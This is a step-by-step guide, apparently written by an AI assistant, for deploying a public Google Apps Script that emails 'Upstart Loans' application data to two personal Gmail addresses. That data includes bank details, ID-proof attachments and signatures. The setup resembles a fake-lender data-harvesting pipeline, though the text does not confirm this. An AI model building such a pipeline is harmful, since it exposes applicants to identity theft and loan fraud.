# Quick Google Apps Script Deployment

## 🚀 **Immediate Deployment - No Experience Needed**

Since you don't have a Google Apps Script yet, here's the fastest way to get emails working:

### **Step 1: Go to Google Apps Script**
1. Visit [script.google.com](https://script.google.com)
2. Click "New Project"
3. Name it: "Upstart Loans Email Service"

### **Step 2: Paste the Script**
1. Delete all default code
2. Copy the **entire content** from `SIMPLE_EMAIL_SCRIPT.gs`
3. Paste it into the editor

### **Step 3: Deploy**
1. Click "Deploy" → "New deployment"
2. Select "Web app"
3. **Settings:**
   - Description: "Upstart Loans Email Service"
   - Execute as: "Me (finnfoxpersonalloan@gmail.com)"
   - Who has access: "Anyone"
4. Click "Deploy"

### **Step 4: Get Your URL**
After deployment, you'll get a URL like:
```
https://script.google.com/macros/s/ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZA567B890C123/exec
```

### **Step 5: Update Your React App**
1. Open `src/pages/LoanApplication.jsx`
2. Find this line:
   ```javascript
   const scriptUrl = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec'
   ```
3. Replace with your actual URL:
   ```javascript
   const scriptUrl = 'https://script.google.com/macros/s/ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZA567B890C123/exec'
   ```

### **Step 6: Test!**
1. Start your React app
2. Fill out a test application
3. Click "Generate Document"
4. Check both emails:
   - `finnfoxpersonalloan@gmail.com`
   - `tyronlincolnn@gmail.com`

## 📧 **What This Script Does:**

### **Initial Application:**
- Sends to BOTH emails simultaneously
- Includes ALL fields: Loan Agent, Term, Purpose, Monthly Payment
- Professional HTML email with proper formatting
- Bank details with masked account numbers

### **Agreement Submission:**
- Sends to BOTH emails simultaneously
- Includes ID proof as base64 attachment
- Complete agreement content
- Signature status and submission date

## ✅ **You're Ready to Go!**

**No Google Apps Script experience needed** - this is copy-paste deployment!

**Both emails will receive:**
- `finnfoxpersonalloan@gmail.com` (Primary - HTML format)
- `tyronlincolnn@gmail.com` (Secondary - Text format)

**All fields included:**
- ✅ Loan Agent
- ✅ Loan Term (Months)
- ✅ Loan Purpose
- ✅ Monthly Payment
- ✅ All original fields
- ✅ ID proof attachments

Deploy the script now and your loan application will immediately start sending emails to both your addresses with all the new fields!
